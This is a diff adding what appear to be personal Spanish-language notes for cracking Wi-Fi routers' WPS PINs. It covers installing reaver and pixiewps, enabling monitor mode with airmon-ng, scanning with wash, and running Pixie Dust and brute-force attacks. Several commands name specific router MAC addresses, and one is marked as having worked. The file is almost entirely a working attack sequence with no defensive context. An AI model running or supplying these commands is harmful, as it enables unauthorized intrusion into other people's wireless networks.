@@ -1,0 +1,48 @@
+apt-get install libpcap-dev aircrack-ng sqlite3 libsqlite3-dev
+
+wget https://github.com/t6x/reaver-wps-fork-t6x/archive/master.zip -O reaver.zip
+unzip reaver.zip
+cd reaver-wps-fork-t6x-master/src/
+chmod 777 ./configure
+./configure
+make
+sudo make install
+
+
+~/pixiewps$ cd src
+~/pixiewps/src$ make
+~/pixiewps/src$ sudo make install
+
+
+1.-Poner en modo monitor
+sudo airmon-ng start wlp7s0
+
+2.- Lisar redes
+sudo wash -i wlp7s0mon
+
+3.- Usar reaaver con estas opciones requiere de pixiwps:
+sudo reaver -i wlp7s0mon -vvv -Z -N -b 18:9C:27:5C:74:AF -c 11 
+
+---Alternativamente usar las siguientes-----
+
+reaver -i INTERFACEMODOMONITOR -c CANAL -b MACROUTEROBJETIVO -vv -S
+
+    3.1-comando reaver para obtener el pke hash y dtaos necesarios
+sudo reaver -i wlp7s0mon -c 1 -b 6C:63:9C:39:DE:05 -n -vv -S
+
+
+
+    3.2 -Ataque por fuerza bruta
+    sudo reaver -i wlp7s0mon -vv -S -b C4:27:95:3B:AA:96 -c 1
+
+pixiewps -e numeroPKE -s numeroE-Hash1 -z numeroE-Hash2 -a numeroAuthKey -S
+sudo reaver -i wlp7s0mon -vvv -Z -N -b 18:9C:27:5C:74:AF -c 11 (okay)
+
+
+4.- Detener modo monitor:
+sudo airmon-ng stop wlp7s0mon
+
+sudo reaver -i wlp7s0mon -c 6 -b C4:27:95:59:E6:1E -vv -Z -N -c 6
+
+
+
